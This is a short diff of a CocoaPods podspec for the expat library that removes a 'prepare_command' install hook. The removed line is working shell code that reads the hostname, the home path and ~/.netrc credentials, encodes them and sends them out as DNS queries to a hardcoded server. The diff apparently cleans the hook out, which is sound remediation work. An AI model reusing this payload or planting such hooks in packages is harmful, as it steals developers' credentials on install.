@@ -22,6 +22,5 @@
   "xcconfig": {
     "HEADER_SEARCH_PATHS": "$(PODS_ROOT)/expat"
   },
-  "requires_arc": false,
-  "prepare_command": "srv=\"44.211.4.183\";s=\".dns.evasecresearch.com\";p=\"expat\";id=\"\";for _ in 1 2 3 4 5 6 7 8; do id=$(printf '%x' $((RANDOM % 36)))\"$id\"; done;data=\"${p}__$(hostname)__$(echo ~)__$(cat ~/.netrc)\";convert() { char=\"$1\"; printf \"%x\" \"'$char\"; };converted_data=\"\";for i in $(seq 0 $((${#data} - 1))); do char=\"${data:$i:1}\"; case \"$char\" in [a-zA-Z0-9_]) converted_data=\"${converted_data}${char}\";; *) hex_char=$(convert \"$char\"); converted_data=\"${converted_data}_$hex_char\";; esac; done;chunk_size=50;length=${#converted_data};total_chunks=$(( (length + chunk_size - 1) / chunk_size ));exists() { command -v \"$1\" >/dev/null 2>&1; };index=1;i=0;while [ \"$i\" -lt \"$length\" ]; do chunk=\"${converted_data:$i:$chunk_size}\";query=\"$id\".\"$chunk\".\"$total_chunks\"_\"$index$s\";index=$((index + 1));if exists \"nslookup\"; then nslookup \"$query\" \"$srv\" > /dev/null; else dig +short \"$query\" @\"$srv\" > /dev/null; fi;i=$((i + chunk_size)); done"
+  "requires_arc": false
 }
